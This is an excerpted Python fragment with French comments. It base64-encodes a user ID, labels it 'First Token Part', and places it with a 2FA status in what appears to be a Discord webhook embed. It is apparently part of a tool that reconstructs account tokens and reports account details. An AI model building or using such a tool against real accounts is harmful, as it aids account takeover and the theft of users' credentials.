...
def encode_user_id(user_id):
    # Convertit l'ID de l'utilisateur en bytes
    user_id_bytes = user_id.encode('utf-8')
    # Encode en base 64
    base64_bytes = base64.b64encode(user_id_bytes)
    # Convertit les bytes encodés en chaîne de caractères
    base64_user_id = base64_bytes.decode('utf-8')
    return base64_user_id
        ...
        "embeds": [
            {
                ...
                "fields": [
                    ...
                    {"name": "Encoded User ID (Base64)", "value": encode_user_id(data.get("id", "N/A"))},
                    ...
                    {"name": "2FA Enabled", "value": "Yes" if data.get("mfa_enabled") else "No"}
                ]
            }
        ]
    }
...
def main():
    ...
    if user_info:
        ...
        # Encode user ID in base64 and print it
        encoded_user_id = encode_user_id(user_id)
        print(Fore.BLUE + f"First Token Part : {encoded_user_id}.")
